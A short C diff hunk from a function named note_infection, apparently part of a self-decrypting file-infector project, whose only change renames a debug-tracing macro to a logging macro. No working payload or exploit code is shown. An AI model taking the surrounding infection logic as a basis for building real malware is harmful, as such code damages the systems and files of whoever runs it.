@@ -52,8 +52,8 @@ void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 {
 //	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
 
-#if DEBUG
-	MID_TRACER("note_infection:\t\t");
+#if LOGGER
+	MID_LOGGER("note_infection:\t\t");
 #endif
 
 	if (context == FAILURE)
